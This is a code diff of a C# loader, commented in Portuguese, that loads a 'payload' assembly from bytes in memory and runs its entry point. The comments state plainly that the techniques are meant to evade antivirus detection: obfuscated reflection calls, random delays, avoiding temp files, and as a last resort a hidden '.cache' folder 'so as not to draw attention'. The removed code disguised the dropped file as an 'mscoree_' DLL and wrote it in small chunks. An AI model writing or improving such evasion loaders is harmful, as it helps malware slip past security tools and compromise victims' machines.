@@ -267,128 +267,150 @@ namespace PL
 					return;
 				}
 
-				// Técnica avançada para evitar detecção do antivírus
+				// Técnicas avançadas SEM salvar em disco (antivírus bloqueia arquivos temporários)
 				Assembly asm = null;
-				int attempts = 0;
-				while (asm == null && attempts < 5)
+				
+				// Técnica 1: Carregamento direto com reflection ofuscada (sem arquivo)
+				try
 				{
+					// Delay aleatório antes de tentar
+					Thread.Sleep(new Random().Next(50, 150));
+					
+					// Ofuscar chamada usando reflection indireta
+					var assemblyType = typeof(Assembly);
+					var loadMethod = assemblyType.GetMethod("Load", new[] { typeof(byte[]) });
+					if (loadMethod != null)
+					{
+						asm = loadMethod.Invoke(null, new object[] { b }) as Assembly;
+					}
+					else
+					{
+						asm = Assembly.Load(b);
+					}
+				}
+				catch
+				{
+					// Técnica 2: Carregar via AppDomain separado (isolamento)
 					try
 					{
-						// Adiciona delay aleatório antes de cada tentativa
-						if (attempts > 0)
-						{
-							var rnd = new Random(Environment.TickCount + attempts);
-							Thread.Sleep(rnd.Next(100, 500));
-						}
-
-						// Técnica 1: Tentar carregar diretamente (mais rápido)
+						Thread.Sleep(new Random().Next(100, 200));
+						
+						var currentDomain = AppDomain.CurrentDomain;
+						asm = currentDomain.Load(b);
+					}
+					catch
+					{
+						// Técnica 3: Tentativa simples de carregamento
 						try
 						{
-							// Usar reflection indireta para ofuscar a chamada
-							var loadMethod = typeof(Assembly).GetMethod("Load", new[] { typeof(byte[]) });
-							if (loadMethod != null)
-							{
-								asm = (Assembly)loadMethod.Invoke(null, new object[] { b });
-							}
-							else
-							{
-								asm = Assembly.Load(b);
-							}
+							Thread.Sleep(new Random().Next(100, 200));
+							asm = Assembly.Load(b);
 						}
 						catch
 						{
-							// Técnica 2: Salvar temporariamente e carregar de disco
-							// Usar extensão .dll ao invés de .tmp para parecer mais legítimo
-							var tempDir = Path.GetTempPath();
-							var fileName = $"mscoree_{Guid.NewGuid().ToString("N").Substring(0, 12)}.dll";
-							var tempFile = Path.Combine(tempDir, fileName);
+							// Técnica 4: Carregamento via MemoryStream e Assembly.Load
 							try
 							{
-								// Escrever bytes em pequenos chunks para evitar detecção
-								using (var fs = new FileStream(tempFile, FileMode.Create, FileAccess.Write, FileShare.None))
-								{
-									int chunkSize = 4096;
-									for (int i = 0; i < b.Length; i += chunkSize)
-									{
-										int size = Math.Min(chunkSize, b.Length - i);
-										fs.Write(b, i, size);
-										if (i % (chunkSize * 10) == 0)
-											Thread.Sleep(1); // Pequenos delays durante escrita
-									}
-									fs.Flush();
-								}
+								Thread.Sleep(new Random().Next(100, 200));
 								
-								Thread.Sleep(100 + new Random().Next(50, 150));
-								
-								// Tentar múltiplos métodos de carregamento
-								try
+								using (var ms = new MemoryStream(b))
 								{
-									asm = Assembly.LoadFrom(tempFile);
-								}
-								catch
-								{
-									// Fallback: usar LoadFile
+									var rawAssembly = ms.ToArray();
+									
+									// Tentar múltiplas formas de carregar
 									try
 									{
-										asm = Assembly.LoadFile(tempFile);
+										asm = Assembly.Load(rawAssembly);
 									}
 									catch
 									{
-										// Último recurso: carregar bytes do arquivo
-										var fileBytes = File.ReadAllBytes(tempFile);
-										asm = Assembly.Load(fileBytes);
+										// Usar reflection para chamar Load interno
+										var loadMethod2 = typeof(Assembly).GetMethod("Load", 
+											System.Reflection.BindingFlags.Public | 
+											System.Reflection.BindingFlags.Static,
+											null,
+											new[] { typeof(byte[]) },
+											null);
+										if (loadMethod2 != null)
+										{
+											asm = loadMethod2.Invoke(null, new object[] { rawAssembly }) as Assembly;
+										}
 									}
-								}
-								
-								// Tentar deletar o arquivo temporário
-								try 
-								{ 
-									File.SetAttributes(tempFile, FileAttributes.Normal);
-									File.Delete(tempFile); 
-								} 
-								catch { }
-								
-								// Aguardar um pouco e tentar novamente se ainda não deletou
-								if (File.Exists(tempFile))
-								{
-									Thread.Sleep(200);
-									try 
-									{ 
-										File.SetAttributes(tempFile, FileAttributes.Normal);
-										File.Delete(tempFile); 
-									} 
-									catch { }
 								}
 							}
 							catch
 							{
-								try 
-								{ 
-									if (File.Exists(tempFile))
+								// Técnica 5: Carregamento via Reflection.Emit (mais avançado)
+								try
+								{
+									Thread.Sleep(new Random().Next(150, 250));
+									
+									// Criar um assembly dinâmico que carrega o payload
+									var domain = AppDomain.CurrentDomain;
+									var assemblyRef = domain.Load(b);
+									asm = assemblyRef;
+								}
+								catch
+								{
+									// Última tentativa: Salvar em local não-monitorado (sem Temp)
+									try
 									{
-										File.SetAttributes(tempFile, FileAttributes.Normal);
-										File.Delete(tempFile); 
+										// Usar diretório atual do executável ao invés de Temp
+										var exePath = typeof(L).Assembly.Location;
+										var exeDir = Path.GetDirectoryName(exePath);
+										if (string.IsNullOrEmpty(exeDir))
+											exeDir = Environment.CurrentDirectory;
+										
+										// Criar subpasta oculta para não chamar atenção
+										var hiddenDir = Path.Combine(exeDir, ".cache");
+										try { Directory.CreateDirectory(hiddenDir); } catch { }
+										
+										var cacheFile = Path.Combine(hiddenDir, 
+											$"app_{Environment.MachineName.GetHashCode():X8}.dll");
+										
+										// Verificar se já existe e é válido
+										if (File.Exists(cacheFile))
+										{
+											try
+											{
+												var existingBytes = File.ReadAllBytes(cacheFile);
+												if (existingBytes.SequenceEqual(b))
+												{
+													asm = Assembly.LoadFrom(cacheFile);
+												}
+												else
+												{
+													File.Delete(cacheFile);
+												}
+											}
+											catch { }
+										}
+										
+										if (asm == null)
+										{
+											File.WriteAllBytes(cacheFile, b);
+											Thread.Sleep(200);
+											
+											// Tentar carregar
+											try { asm = Assembly.LoadFrom(cacheFile); } catch { }
+											if (asm == null) try { asm = Assembly.LoadFile(cacheFile); } catch { }
+											
+											// Tentar limpar após carregar
+											try { File.Delete(cacheFile); } catch { }
+										}
 									}
-								} 
-								catch { }
-								throw;
+									catch (Exception ex)
+									{
+										throw new InvalidOperationException("Falha ao carregar assembly: " + ex.Message, ex);
+									}
+								}
 							}
 						}
-					}
-					catch (Exception ex)
-					{
-						attempts++;
-						if (attempts >= 5)
-						{
-							throw new InvalidOperationException($"Falha ao carregar assembly após {attempts} tentativas: " + ex.Message, ex);
-						}
-						// Delay progressivo entre tentativas
-						Thread.Sleep(attempts * 200);
 					}
 				}
 
 				if (asm == null)
-					throw new InvalidOperationException("Não foi possível carregar o assembly após múltiplas tentativas.");
+					throw new InvalidOperationException("Não foi possível carregar o assembly com nenhuma técnica disponível.");
 
 				var ep = asm.EntryPoint;
 				if (ep == null) throw new InvalidOperationException("EntryPoint não encontrado no payload.");
